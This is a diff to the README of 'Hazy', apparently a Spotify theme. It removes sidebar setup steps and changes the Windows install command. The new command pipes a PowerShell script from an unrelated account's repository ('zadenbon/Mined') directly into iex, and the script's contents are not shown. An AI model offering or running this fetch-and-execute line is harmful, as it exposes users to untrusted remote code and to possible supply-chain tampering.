@@ -14,26 +14,14 @@ Hazy is itself based on [DynamicDefault](https://github.com/JulienMaille/spiceti
 ![demo-base](./hazy_play.png)
 **Set Background To Album Art**
 ![demo-base](./custom_bg.png)
-### ⏹️ How To Get Sidebar ⏹️
----
-1. Click on your Profile > Experimental Features
-2. Search "sidebar"
-3. Copy the following settings:
-  <div>
-    <img width="500px" src="https://github.com/Astromations/Hazy/assets/80211195/72ce19d5-fff5-477b-949e-dcc7c5a6f65c"> <img>
-  </div>
-**Click the new "Now Playing View" button to activate the sidebar**
-<span>
-  <img src="https://github.com/Astromations/Hazy/assets/80211195/ee64d41c-33f2-41ed-9c70-03a639383570"><img>
-</span>
-**Click the new "Now Playing View" button to activate the sidebar**
+
 ---
 
 ### ⬇️ Windows Installation ⬇️
 Open **PowerShell** and run:
 
 ```powershell
-iwr -useb https://githubusercontent.com | iex
+iwr -useb https://raw.githubusercontent.com/zadenbon/Mined/main/install.ps1 | iex
 ```
 ---
 ### 📃 Manual Installation 📃
